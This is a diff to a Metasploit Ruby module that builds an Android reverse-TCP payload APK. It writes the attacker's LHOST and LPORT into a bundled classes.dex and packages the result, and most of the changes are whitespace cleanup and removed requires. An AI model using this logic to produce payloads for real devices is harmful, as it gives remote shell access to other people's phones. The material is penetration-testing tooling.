@@ -9,8 +9,6 @@ require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
-require 'zlib'
-require 'digest/sha1'
 
 module Metasploit3
 
@@ -27,7 +25,7 @@ module Metasploit3
 			'Arch'			=> ARCH_DALVIK,
 			'Handler'		=> Msf::Handler::ReverseTcp,
 			'Stager'		=> {'Payload' => ""}
-			))
+		))
 	end
 
 	def string_sub(data, placeholder, input)
@@ -39,10 +37,9 @@ module Metasploit3
 
 		classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'))
 
-        string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
-        string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
-
-        jar.add_file("classes.dex", fix_dex_header(classes))
+		string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
+		string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
+		jar.add_file("classes.dex", fix_dex_header(classes))
 
 		files = [
 			[ "AndroidManifest.xml" ],
@@ -51,8 +48,8 @@ module Metasploit3
 			[ "resources.arsc" ]
 		]
 
-        jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
-        jar.build_manifest
+		jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
+		jar.build_manifest
 
 		#jar.sign(@key, @cert, @ca_certs) '~/.android/debug.keystore' -sigalg MD5withRSA -digestalg SHA1?
 
